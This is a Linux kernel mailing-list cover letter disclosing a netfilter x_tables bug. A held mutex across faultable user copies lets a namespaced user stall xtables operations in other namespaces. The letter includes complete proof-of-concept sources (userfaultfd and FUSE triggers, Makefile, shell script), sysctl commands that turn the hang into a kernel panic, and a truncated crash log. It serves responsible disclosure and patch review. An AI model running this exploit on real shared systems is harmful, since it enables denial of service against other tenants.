Received: from mail-pf1-f169.google.com (mail-pf1-f169.google.com [209.85.210.169])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id EF3EA2E975E
	for <netfilter-devel@vger.kernel.org>; Tue,  1 Sep 2026 13:48:05 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.169
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1788270488; cv=none; b=XjWlTS3Hly+qSAIYItAZFg/o5z6UkkmcnYF7mKbWswcPjRCkH5XuMzZWpWxFMxO62WAEwVbPvma7ivIChYI0XO3pXqO6rXpGAaFmg1zth21XcUdTNh/lsryh+E3zuiV5D84j3528Nsl1dyHNFKxpvu5OMwVfkmv15ARULTg1Q3w=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1788270488; c=relaxed/simple;
	bh=q77WVmjPUreWNe4sILpyj5nuJbslgyxkFz3+5yWBg04=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=qEQZwD62kja8kTtCu9D8Q9Qf0VhQF7KWhYEskYM5JvmnHxaGhtYvLNd04QU/+LCKkyNb/vaux6UZI9QPh+llRlYenjU3VMxnKRec7f58iAVqyqv6A6OGMrKDe/yL9d2R7A2Co18/43uy6WYUU6mOPCF3EFgnUvSX/8G30R/1XrU=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=jV57DDQY; arc=none smtp.client-ip=209.85.210.169
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="jV57DDQY"
Received: by mail-pf1-f169.google.com with SMTP id d2e1a72fcca58-8518b3ff3e9so4698348b3a.2
        for <netfilter-devel@vger.kernel.org>; Tue, 01 Sep 2026 06:48:05 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1788270485; x=1788875285; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=BlBruXn5JtL5x06rkieP2js8TkdpfhaQTdxgKzKIm9s=;
        b=jV57DDQY1MJAAeJH7z8B7d8nYGjTCPYI/Qj7NcTpHkm1iqKVe4m0vabDyVT3S5zMXX
         kjGypi+vXCiYrU+NmufG+zQxfppHmtwn8HMN6AxSQAbeq/OAB0CDcmM+Gn67HZBC3EEx
         aOH1KrmjwVlQCZ8Z3NOWQo0aMtf5xbt5/QIguhH98Gon3YgB/1LTJEpl9uxddC888o6z
         Ld9vrsKEX7J9AtGWdahT0rmpF3E4H4BQ2I2Y24YwWptrezS8XmqhQUxhTAC2CBNVKQN3
         R2I9vbGuixZnDBejmMowHQeiuyhgzf8frXhaIVYnsIOTIM1JsbdrzHGim6OfljSVIwnB
         hkDQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1788270485; x=1788875285;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=BlBruXn5JtL5x06rkieP2js8TkdpfhaQTdxgKzKIm9s=;
        b=iXryB4Mw0B5Aj2drTukW9N4AFOLXf4x8T4k9vPSeUjYOkiWKmVfGpt0+Z9O9ARiOQg
         TUu4RWhG7q2y1u56XxueFNyZE7Zo5ps/EoZQK291OdWTlrgVVl4/V5gFxjXmP1jLxheR
         a5UFit1ldEA3vDROUwbrdLG2u0cS9FcbspT13hByc28t9+vE/HTfUMl4Llvs0ouypjZG
         qKoBihW2dIkCHkVWWS70lU6jPJAdW7uiFf2aVVsdlFwImU1LZcgx8f4wb1yS9vDrzJNF
         93klntph4aFfmwNpZbh9gYJ0h1LiJfGtoPrEHCJEgbIXXYSowxYuAzP4cjeXcomMOrfG
         wX4g==
X-Forwarded-Encrypted: i=1; AHgh+RqrYndxzDGMXnrNrdLXFcPXRN2W4ZQ/lqjOyAGyS8lq9LH3RF0YxaEhQqQoxzBQy9cubEEARTV7wnWvSyVbGUo=@vger.kernel.org
X-Gm-Message-State: AFuF++mGq6ffoX4DTtbjrv2y1+T7ogicL4iBJruWLVOxrTBpf70tL9EH
	D+c0ZwURuzNqcIUtWJzwBHvBTBnD6789g4TsA9ssjkLhPuWSGy7Mngc2SxYz4futDmGZ
X-Gm-Gg: AR+sD11UDnqzOia35yxVcIHue/+unX+9cROE3/QYTh26EfSpIhDfhzpNBnwvw2oN23h
	hAqnkEim6qoSclPVqZHmg1ydFucY+QYMg2GJlENxq8sjfBz13P+ARZMxplEfkanPm3yzpodFgY1
	hKafUSQs/xgoU0wcG6V7Im/TE+T8w/C/VOgzLbG8jQ7ZLsSXm+oNTHMyPtt8/8juguHw3lkSFYf
	LjFgMyY9L4/vIzvBbhELC2sT57xUXQuufTOnv5BO8TR5hitrGZC/iLmbTggaog1MxSmtN92ZIjX
	2VltPpMbwtCNTMZWgxs2s4LMkHzs40fTFSZz5DLWRer/hIxjHuiUNF7TPks9Z57gZRaPmn73D+M
	NLmqkCKOvryIDMX1CFeEfBCs/5VCNexFs/b/6UN5kB3psNFsA+T72rWMk9R0C7oQuTFIZcUi7q/
	Z5I5u+PH/7ar0J8pt5o80n5pyQUIz19w5PaxnJEhnxetdNbVoRFsF/B+rX+KOd0sWp7DKMw74QP
	yd0lWDzHkyxpt9sX2p4vLWjucwnYQ==
X-Received: by 2002:a05:6a00:1913:b0:857:4ed5:98ee with SMTP id d2e1a72fcca58-85b5a34e859mr10604582b3a.9.1788270484950;
        Tue, 01 Sep 2026 06:48:04 -0700 (PDT)
Received: from b6ad5085b32f.. ([122.51.212.64])
        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-85be5d9bcd7sm1166303b3a.11.2026.09.01.06.47.59
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Tue, 01 Sep 2026 06:48:02 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: Pablo Neira Ayuso <pablo@netfilter.org>,
	Florian Westphal <fw@strlen.de>
Cc: Zihan Xi <zihanx@nebusec.ai>,
	Phil Sutter <phil@nwl.cc>,
	"David S . Miller" <davem@davemloft.net>,
	Eric Dumazet <edumazet@google.com>,
	Jakub Kicinski <kuba@kernel.org>,
	Paolo Abeni <pabeni@redhat.com>,
	Simon Horman <horms@kernel.org>,
	netfilter-devel@vger.kernel.org,
	coreteam@netfilter.org,
	netdev@vger.kernel.org,
	linux-kernel@vger.kernel.org
Subject: [PATCH nf 0/1] netfilter: x_tables: avoid holding mutex over faultable user copies
Date: Tue,  1 Sep 2026 13:47:53 +0000
Message-ID: <cover.1788244146.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
Precedence: bulk
X-Mailing-List: netfilter-devel@vger.kernel.org
List-Id: <netfilter-devel.vger.kernel.org>
List-Subscribe: <mailto:netfilter-devel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netfilter-devel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue in net/ipv4/netfilter/arp_tables.c. The
same lock-scope bug is also in net/ipv4/netfilter/ip_tables.c and
net/ipv6/netfilter/ip6_tables.c. A non-root user with CAP_NET_ADMIN in a
private user and network namespace can trigger it with a FUSE-backed
output buffer. We've tested it, and it should not affect any other
functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

GET_INFO and GET_ENTRIES hold a per-family mutex across faultable
userspace copies. Unrelated xtables operations then block, including
callers in other network namespaces. The mutex belongs to the protocol
family, not to a network namespace. The capability check is
ns_capable(sock_net(sk)->user_ns, CAP_NET_ADMIN).

The non-root reproducer is the FUSE path. The FUSE daemon is mounted in
the initial namespace. The trigger starts in a private user and network
namespace and moves only the GET_ENTRIES holder into a second network
namespace; the waiter stays in the trigger's network namespace. poc.c
uses userfaultfd and is root-only on the tested guest because
vm.unprivileged_userfaultfd=0.

We reproduced this on the ARP path. IPv4 and IPv6 have the same lock
scope and are changed in this patch, but were not separately run.

In the unpatched run, parent/waiter netns were net:[4026532203],
holder netns was net:[4026532273], holder wchan was
folio_wait_bit_common, and waiter wchan was xt_find_table_lock. In the
fixed run, the same distinct netns IDs were observed, the holder
remained in folio_wait_bit_common, and GET_INFO returned immediately
with waiter wchan=0.

The earliest available table implementation snapshot already contains this
root-cause fact. Later namespace support only made the existing lock
scope reachable by a non-root user. This patch disables page faults during
the locked copy so a fault returns -EFAULT, releases the table locks,
faults in the output range, and retries once. `fault_in_writeable()` is
called at most once and does not pin pages. If a large table or a later
reclaim makes the second inatomic copy fail, it returns -EFAULT. That is
a bounded failure; it does not take the xtables mutex into a user page
fault. GET_INFO now copies its fixed-size result after unlocking; native
and compat GET_ENTRIES use the same retry pattern.

The locked GET_ENTRIES path is still a whole-table inatomic copy. This
patch removes the faultable sleep from that window; it does not shorten
the lock hold time of a successful copy. GET_ENTRIES can still sleep
under the lock in alloc_counters()/vzalloc() and cond_resched(). Those
are kernel-side, bounded waits, not a user-controlled page fault.

ebtables GET still copies to userspace under ebt_mutex. That is the same
class of bug on a different lock, not a bypass of the
xt[AF_INET/AF_INET6/NFPROTO_ARP] mutexes this patch changes.

The `Fixes:` commit, 1da177e4c3f4 ("Linux-2.6.12-rc2"), is an initial Git
root commit with no parent. Its snapshot contains the root-cause fact,
but the parent-versus-commit first-introduction test cannot be performed.
The historical attribution therefore remains uncertain; the trailer
records this commit only as the earliest available Git anchor, not as a
proven first introduction.

Reproducer:

The following files must be saved with these exact names in one directory.
The commands below build all helpers and run the FUSE/user-namespace path.
The FUSE helper binary is named poc-userns-trig so the hung-task comm
matches the crash log. The captured panic is hung_task after that task
blocked for more than 10 seconds, and then khungtaskd panics because
hung_task_panic=1. A 10-second timeout alone only warns; it does not
panic. The tested guest enabled panic on the kernel command line with
hung_task_panic=1 hung_task_timeout_secs=10
hung_task_check_interval_secs=10 panic=-1. poc.sh, poc-userns-trig and
poc.c also write these sysctls when they are writable:

    echo 10 > /proc/sys/kernel/hung_task_timeout_secs
    echo 10 > /proc/sys/kernel/hung_task_check_interval_secs
    echo 10 > /proc/sys/kernel/hung_task_warnings
    echo 1 > /proc/sys/kernel/hung_task_panic

A non-root user namespace cannot change them. Set them as root in the
initial namespace, or pass the same tokens on the kernel command line,
if the helpers run unprivileged.

    mkdir -p /tmp/xtables-poc
    cd /tmp/xtables-poc
    apt-get update
    apt-get install -y fuse3 libfuse3-dev pkg-config
    make
    ./poc.sh

For the root-only userfaultfd path, build poc.c. unshare -Urn is shown
below; on the tested guest the helper must run as root because
unprivileged userfaultfd is disabled:

    gcc -O2 -static -o poc poc.c
    unshare -Urn ./poc

For the tested root QEMU image, run the helper directly as root if the
outer user namespace does not permit the required proc sysctls:

    ./poc

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
The guest uses qemu-system-x86_64 with KVM (-machine accel=kvm -cpu host),
the QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX) machine, 2 CPUs (-smp 2), 2 GiB
RAM (-m 2G), and a serial console (console=ttyS0). The captured serial log
used the kernel command line:

    root=/dev/sda rw console=ttyS0 net.ifnames=0 panic=-1
    hung_task_panic=1 hung_task_timeout_secs=10
    hung_task_check_interval_secs=10

The serial logs report 2 CPUs and 2096632K RAM.

------BEGIN poc.c------
#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/netfilter_arp/arp_tables.h>
#include <linux/userfaultfd.h>
#include <netinet/in.h>
#include <poll.h>
#include <sched.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#ifndef ARRAY_SIZE
#define ARRAY_SIZE(x) (sizeof(x) / sizeof((x)[0]))
#endif

static const char *table_name = "filter";

static void die(const char *msg)
{
	perror(msg);
	exit(EXIT_FAILURE);
}

static void write_text_file(const char *path, const char *value)
{
	int fd;
	ssize_t len;

	fd = open(path, O_WRONLY | O_CLOEXEC);
	if (fd < 0)
		die(path);

	len = (ssize_t)strlen(value);
	if (write(fd, value, len) != len) {
		close(fd);
		die(path);
	}

	close(fd);
}

static int make_ipv4_sock(void)
{
	int fd = socket(AF_INET, SOCK_DGRAM, 0);

	if (fd < 0)
		die("socket(AF_INET, SOCK_DGRAM)");
	return fd;
}

static unsigned int fetch_table_size(void)
{
	struct arpt_getinfo info;
	socklen_t len = sizeof(info);
	int fd = make_ipv4_sock();

	memset(&info, 0, sizeof(info));
	strncpy(info.name, table_name, sizeof(info.name) - 1);

	if (getsockopt(fd, SOL_IP, ARPT_SO_GET_INFO, &info, &len) < 0)
		die("getsockopt(ARPT_SO_GET_INFO)");
	if (len != sizeof(info)) {
		fprintf(stderr, "unexpected ARPT_SO_GET_INFO length %u\n",
			(unsigned int)len);
		exit(EXIT_FAILURE);
	}

	close(fd);
	return info.size;
}

static int setup_userfaultfd(void *addr, size_t len)
{
	struct uffdio_api api;
	struct uffdio_register reg;
	int uffd;

	uffd = syscall(SYS_userfaultfd, 0);
	if (uffd < 0)
		die("userfaultfd");

	memset(&api, 0, sizeof(api));
	api.api = UFFD_API;
	if (ioctl(uffd, UFFDIO_API, &api) < 0)
		die("UFFDIO_API");

	memset(&reg, 0, sizeof(reg));
	reg.range.start = (unsigned long)addr;
	reg.range.len = len;
	reg.mode = UFFDIO_REGISTER_MODE_MISSING;
	if (ioctl(uffd, UFFDIO_REGISTER, &reg) < 0)
		die("UFFDIO_REGISTER");

	return uffd;
}

static void hang_in_get_entries(unsigned int table_size)
{
	size_t page_size = (size_t)sysconf(_SC_PAGESIZE);
	size_t data_len = (table_size + page_size - 1) & ~(page_size - 1);
	size_t map_len = page_size + data_len;
	char *mapping;
	struct arpt_get_entries *get;
	socklen_t len;
	int fd;
	int uffd;

	mapping = mmap(NULL, map_len, PROT_READ | PROT_WRITE,
		       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (mapping == MAP_FAILED)
		die("mmap");

	get = (struct arpt_get_entries *)(mapping + page_size - sizeof(*get));
	memset(get, 0, sizeof(*get));
	strncpy(get->name, table_name, sizeof(get->name) - 1);
	get->size = table_size;

	uffd = setup_userfaultfd(mapping + page_size, data_len);
	(void)uffd;

	fd = make_ipv4_sock();
	len = sizeof(*get) + table_size;

	fprintf(stderr,
		"holder[%d]: calling ARPT_SO_GET_ENTRIES with %u-byte table and a missing output page\n",
		getpid(), table_size);
	fflush(stderr);

	if (getsockopt(fd, SOL_IP, ARPT_SO_GET_ENTRIES, get, &len) == 0) {
		fprintf(stderr,
			"holder[%d]: GET_ENTRIES unexpectedly returned\n",
			getpid());
		exit(EXIT_FAILURE);
	}

	fprintf(stderr, "holder[%d]: unexpected errno=%d (%s)\n",
		getpid(), errno, strerror(errno));
	exit(EXIT_FAILURE);
}

static void block_on_xt_mutex(void)
{
	struct arpt_getinfo info;
	socklen_t len = sizeof(info);
	int fd = make_ipv4_sock();

	memset(&info, 0, sizeof(info));
	strncpy(info.name, table_name, sizeof(info.name) - 1);

	fprintf(stderr,
		"waiter[%d]: calling ARPT_SO_GET_INFO and should block on xt[NFPROTO_ARP].mutex\n",
		getpid());
	fflush(stderr);

	if (getsockopt(fd, SOL_IP, ARPT_SO_GET_INFO, &info, &len) == 0) {
		fprintf(stderr, "waiter[%d]: GET_INFO unexpectedly returned\n",
			getpid());
		exit(EXIT_FAILURE);
	}

	fprintf(stderr, "waiter[%d]: unexpected errno=%d (%s)\n",
		getpid(), errno, strerror(errno));
	exit(EXIT_FAILURE);
}

static pid_t spawn_child(void (*fn)(unsigned int), unsigned int arg)
{
	pid_t pid = fork();

	if (pid < 0)
		die("fork");
	if (pid == 0) {
		prctl(PR_SET_PDEATHSIG, SIGKILL);
		fn(arg);
		_exit(EXIT_FAILURE);
	}
	return pid;
}

static pid_t spawn_waiter_child(void)
{
	pid_t pid = fork();

	if (pid < 0)
		die("fork");
	if (pid == 0) {
		prctl(PR_SET_PDEATHSIG, SIGKILL);
		block_on_xt_mutex();
		_exit(EXIT_FAILURE);
	}
	return pid;
}

static void dump_proc_state(pid_t pid, const char *tag)
{
	char path[64];
	char buf[256];
	int fd;
	ssize_t n;

	snprintf(path, sizeof(path), "/proc/%d/wchan", pid);
	fd = open(path, O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		return;
	n = read(fd, buf, sizeof(buf) - 1);
	close(fd);
	if (n <= 0)
		return;
	buf[n] = '\0';
	fprintf(stderr, "%s[%d]: wchan=%s\n", tag, pid, buf);
}

int main(void)
{
	unsigned int table_size;
	pid_t holder;
	pid_t waiter;
	unsigned int i;

	if (geteuid() != 0) {
		fprintf(stderr, "run as root for the userfaultfd-based trigger path\n");
		return EXIT_FAILURE;
	}

	table_size = fetch_table_size();
	fprintf(stderr, "parent[%d]: table \"%s\" size=%u bytes\n",
		getpid(), table_name, table_size);

	write_text_file("/proc/sys/kernel/hung_task_timeout_secs", "10\n");
	write_text_file("/proc/sys/kernel/hung_task_check_interval_secs", "10\n");
	write_text_file("/proc/sys/kernel/hung_task_warnings", "10\n");
	write_text_file("/proc/sys/kernel/hung_task_panic", "1\n");

	holder = spawn_child(hang_in_get_entries, table_size);
	sleep(1);
	waiter = spawn_waiter_child();

	fprintf(stderr,
		"parent[%d]: holder=%d waiter=%d; waiting for hung-task panic\n",
		getpid(), holder, waiter);
	fflush(stderr);

	for (i = 0; i < 120; i++) {
		dump_proc_state(holder, "holder");
		dump_proc_state(waiter, "waiter");
		sleep(1);
	}

	fprintf(stderr, "parent[%d]: timeout without kernel panic\n", getpid());
	kill(holder, SIGKILL);
	kill(waiter, SIGKILL);
	waitpid(holder, NULL, 0);
	waitpid(waiter, NULL, 0);
	return EXIT_FAILURE;
}
------END poc.c--------

------BEGIN poc_userns_trigger.c------
#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <linux/netfilter_arp/arp_tables.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sched.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#ifndef SOL_IP
#define SOL_IP 0
#endif

static const char *table_name = "filter";

static void die(const char *msg)
{
	perror(msg);
	exit(EXIT_FAILURE);
}

static void write_text_file_best_effort(const char *path, const char *value)
{
	int fd;
	ssize_t len;

	fd = open(path, O_WRONLY | O_CLOEXEC);
	if (fd < 0)
		return;
	len = (ssize_t)strlen(value);
	(void)write(fd, value, len);
	close(fd);
}

static void configure_hung_task(void)
{
	write_text_file_best_effort("/proc/sys/kernel/hung_task_timeout_secs",
				    "10\n");
	write_text_file_best_effort("/proc/sys/kernel/hung_task_check_interval_secs",
				    "10\n");
	write_text_file_best_effort("/proc/sys/kernel/hung_task_warnings", "10\n");
	write_text_file_best_effort("/proc/sys/kernel/hung_task_panic", "1\n");
}

static int make_ipv4_sock(void)
{
	int fd = socket(AF_INET, SOCK_DGRAM, 0);

	if (fd < 0)
		die("socket(AF_INET, SOCK_DGRAM)");
	return fd;
}

static unsigned int fetch_table_size(void)
{
	struct arpt_getinfo info;
	socklen_t len = sizeof(info);
	int fd = make_ipv4_sock();

	memset(&info, 0, sizeof(info));
	strncpy(info.name, table_name, sizeof(info.name) - 1);

	if (getsockopt(fd, SOL_IP, ARPT_SO_GET_INFO, &info, &len) < 0)
		die("getsockopt(ARPT_SO_GET_INFO)");

	close(fd);
	return info.size;
}

static void hang_in_get_entries(unsigned int table_size, const char *path)
{
	size_t page_size = (size_t)sysconf(_SC_PAGESIZE);
	size_t map_len = page_size * 2;
	char *mapping;
	struct arpt_get_entries *get;
	int backing_fd;
	int sock;
	socklen_t len;

	mapping = mmap(NULL, map_len, PROT_READ | PROT_WRITE,
		       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (mapping == MAP_FAILED)
		die("mmap anonymous");

	backing_fd = open(path, O_RDWR | O_CLOEXEC);
	if (backing_fd < 0)
		die("open fuse file");

	if (mmap(mapping + page_size, page_size, PROT_READ | PROT_WRITE,
		 MAP_PRIVATE | MAP_FIXED, backing_fd, 0) == MAP_FAILED)
		die("mmap fuse page");
	close(backing_fd);

	get = (struct arpt_get_entries *)(mapping + page_size - sizeof(*get));
	memset(get, 0, sizeof(*get));
	strncpy(get->name, table_name, sizeof(get->name) - 1);
	get->size = table_size;

	sock = make_ipv4_sock();
	len = sizeof(*get) + table_size;

	fprintf(stderr,
		"holder[%d]: namespace GET_ENTRIES using FUSE-backed output page\n",
		getpid());
	fflush(stderr);

	if (getsockopt(sock, SOL_IP, ARPT_SO_GET_ENTRIES, get, &len) == 0) {
		fprintf(stderr, "holder[%d]: GET_ENTRIES unexpectedly returned\n",
			getpid());
		exit(EXIT_FAILURE);
	}

	fprintf(stderr, "holder[%d]: unexpected errno=%d (%s)\n",
		getpid(), errno, strerror(errno));
	exit(EXIT_FAILURE);
}

static void block_on_xt_mutex(void)
{
	struct arpt_getinfo info;
	socklen_t len = sizeof(info);
	int sock = make_ipv4_sock();

	memset(&info, 0, sizeof(info));
	strncpy(info.name, table_name, sizeof(info.name) - 1);

	fprintf(stderr,
		"waiter[%d]: namespace GET_INFO expected to block on xt mutex\n",
		getpid());
	fflush(stderr);

	if (getsockopt(sock, SOL_IP, ARPT_SO_GET_INFO, &info, &len) == 0) {
		fprintf(stderr, "waiter[%d]: GET_INFO unexpectedly returned\n",
			getpid());
		exit(EXIT_FAILURE);
	}

	fprintf(stderr, "waiter[%d]: unexpected errno=%d (%s)\n",
		getpid(), errno, strerror(errno));
	exit(EXIT_FAILURE);
}

static void dump_netns(pid_t pid, const char *tag)
{
	char path[64];
	char link[128];
	ssize_t n;

	snprintf(path, sizeof(path), "/proc/%d/ns/net", pid);
	n = readlink(path, link, sizeof(link) - 1);
	if (n <= 0)
		return;
	link[n] = '\0';
	fprintf(stderr, "%s[%d]: netns=%s\n", tag, pid, link);
}

static void dump_wchan(pid_t pid, const char *tag)
{
	char path[64];
	char buf[256];
	int fd;
	ssize_t n;

	snprintf(path, sizeof(path), "/proc/%d/wchan", pid);
	fd = open(path, O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		return;
	n = read(fd, buf, sizeof(buf) - 1);
	close(fd);
	if (n <= 0)
		return;
	buf[n] = '\0';
	fprintf(stderr, "%s[%d]: wchan=%s\n", tag, pid, buf);
}

int main(int argc, char **argv)
{
	unsigned int table_size;
	pid_t holder;
	pid_t waiter;
	unsigned int i;

	if (argc != 2) {
		fprintf(stderr, "usage: %s <fuse-file-path>\n", argv[0]);
		return EXIT_FAILURE;
	}

	configure_hung_task();

	if (geteuid() != 0) {
		fprintf(stderr,
			"run under unshare -Urn so the process has namespace-local CAP_NET_ADMIN\n");
		return EXIT_FAILURE;
	}

	table_size = fetch_table_size();
	dump_netns(getpid(), "parent");
	fprintf(stderr, "parent[%d]: namespace table size=%u bytes\n",
		getpid(), table_size);

	holder = fork();
	if (holder < 0)
		die("fork");
	if (holder == 0) {
		prctl(PR_SET_PDEATHSIG, SIGKILL);
		if (unshare(CLONE_NEWNET) < 0)
			die("unshare(CLONE_NEWNET)");
		table_size = fetch_table_size();
		fprintf(stderr,
			"holder[%d]: entered a separate network namespace\n",
			getpid());
		hang_in_get_entries(table_size, argv[1]);
	}

	sleep(1);

	waiter = fork();
	if (waiter < 0)
		die("fork");
	if (waiter == 0) {
		prctl(PR_SET_PDEATHSIG, SIGKILL);
		dump_netns(getpid(), "waiter");
		block_on_xt_mutex();
	}

	fprintf(stderr,
		"parent[%d]: holder=%d waiter=%d; waiting for hung-task panic\n",
		getpid(), holder, waiter);
	fflush(stderr);

	for (i = 0; i < 180; i++) {
		dump_netns(holder, "holder");
		dump_netns(waiter, "waiter");
		dump_wchan(holder, "holder");
		dump_wchan(waiter, "waiter");
		sleep(1);
	}

	kill(holder, SIGKILL);
	kill(waiter, SIGKILL);
	waitpid(holder, NULL, 0);
	waitpid(waiter, NULL, 0);
	return EXIT_FAILURE;
}
------END poc_userns_trigger.c------

------BEGIN fuse_stall.c------
#define FUSE_USE_VERSION 31

#include <errno.h>
#include <fuse3/fuse.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

static const char *file_name = "stall.bin";
static const size_t file_size = 4096;

static int stall_getattr(const char *path, struct stat *st,
			 struct fuse_file_info *fi)
{
	(void)fi;
	memset(st, 0, sizeof(*st));

	if (strcmp(path, "/") == 0) {
		st->st_mode = S_IFDIR | 0755;
		st->st_nlink = 2;
		return 0;
	}

	if (strcmp(path, "/stall.bin") == 0) {
		st->st_mode = S_IFREG | 0666;
		st->st_nlink = 1;
		st->st_size = file_size;
		return 0;
	}

	return -ENOENT;
}

static int stall_readdir(const char *path, void *buf, fuse_fill_dir_t filler,
			 off_t off, struct fuse_file_info *fi,
			 enum fuse_readdir_flags flags)
{
	(void)off;
	(void)fi;
	(void)flags;

	if (strcmp(path, "/") != 0)
		return -ENOENT;

	filler(buf, ".", NULL, 0, 0);
	filler(buf, "..", NULL, 0, 0);
	filler(buf, file_name, NULL, 0, 0);
	return 0;
}

static int stall_open(const char *path, struct fuse_file_info *fi)
{
	(void)fi;

	if (strcmp(path, "/stall.bin") != 0)
		return -ENOENT;
	return 0;
}

static int stall_read(const char *path, char *buf, size_t size, off_t off,
		      struct fuse_file_info *fi)
{
	(void)buf;
	(void)size;
	(void)off;
	(void)fi;

	if (strcmp(path, "/stall.bin") != 0)
		return -ENOENT;

	fprintf(stderr,
		"fuse[%d]: read request for stall.bin received; stalling indefinitely\n",
		getpid());
	fflush(stderr);

	for (;;)
		pause();
}

static const struct fuse_operations stall_ops = {
	.getattr = stall_getattr,
	.readdir = stall_readdir,
	.open = stall_open,
	.read = stall_read,
};

int main(int argc, char **argv)
{
	if (argc != 2) {
		fprintf(stderr, "usage: %s <mountpoint>\n", argv[0]);
		return EXIT_FAILURE;
	}

	return fuse_main(argc, argv, &stall_ops, NULL);
}
------END fuse_stall.c------

------BEGIN Makefile------
CC ?= gcc
CFLAGS ?= -O2 -Wall -Wextra
PKG_CONFIG ?= pkg-config

FUSE_AVAILABLE := $(shell $(PKG_CONFIG) --exists fuse3 && echo 1 || echo 0)
FUSE_CFLAGS := $(shell $(PKG_CONFIG) --cflags fuse3 2>/dev/null)
FUSE_LIBS := $(shell $(PKG_CONFIG) --libs fuse3 2>/dev/null)

ifeq ($(FUSE_AVAILABLE),1)
ALL_TARGETS := poc poc-userns-trig fuse_stall
else
ALL_TARGETS := poc poc-userns-trig
endif

.PHONY: all clean

all: $(ALL_TARGETS)

poc: poc.c
	$(CC) $(CFLAGS) -o $@ $<

poc-userns-trig: poc_userns_trigger.c
	$(CC) $(CFLAGS) -o $@ $<

fuse_stall: fuse_stall.c
ifeq ($(FUSE_AVAILABLE),1)
	$(CC) $(CFLAGS) $(FUSE_CFLAGS) -o $@ $< $(FUSE_LIBS)
else
	@echo "fuse3 headers not found; install libfuse3-dev in the guest to build fuse_stall" >&2
	@exit 1
endif

clean:
	rm -f poc poc-userns-trig fuse_stall
------END Makefile------

------BEGIN poc.sh------
#!/bin/sh
set -eu

mnt="${1:-$HOME/fusemnt}"
fuse_bin="${FUSE_BIN:-./fuse_stall}"
trigger_bin="${TRIGGER_BIN:-./poc-userns-trig}"
log_file="${FUSE_LOG:-$HOME/fuse_stall.log}"

# Match the captured hung_task panic: 10-second timeout. These writes
# succeed as root in the initial user namespace and are skipped otherwise.
echo 10 > /proc/sys/kernel/hung_task_timeout_secs 2>/dev/null || true
echo 10 > /proc/sys/kernel/hung_task_check_interval_secs 2>/dev/null || true
echo 10 > /proc/sys/kernel/hung_task_warnings 2>/dev/null || true
echo 1 > /proc/sys/kernel/hung_task_panic 2>/dev/null || true

fusermount3 -u -q "$mnt" 2>/dev/null || true
rm -rf "$mnt"
mkdir -p "$mnt"

"$fuse_bin" "$mnt" >"$log_file" 2>&1 &
for _ in $(seq 1 50); do
	if [ -e "$mnt/stall.bin" ]; then
		exec unshare -Urn "$trigger_bin" "$mnt/stall.bin"
	fi
	sleep 0.2
done

echo "timed out waiting for $mnt/stall.bin" >&2
exit 1
------END poc.sh------

----BEGIN crash log----

[  196.097188] INFO: task poc-userns-trig:287 blocked for more than 10 seconds.
[  196.097230]       Not tainted 7.2.0-15794-g1b78070aaef6 #4
[  196.097249] "echo 0 > /proc/sys/kernel/hung_task_timeout_secs" disables this message.
[  196.097254] task:poc-userns-trig state:D stack:14560 pid:287   tgid:287   ppid:285    task_flags:0x400140 flags:0x00080000
[  196.097278] Call Trace:
[  196.097284]  <TASK>
[  196.097290]  __schedule (kernel/sched/core.c:5520 kernel/sched/core.c:7270)
[  196.097299]  schedule (kernel/sched/core.c:7347 kernel/sched/core.c:7362)
[  196.097304]  schedule_preempt_disabled (kernel/sched/core.c:7419)
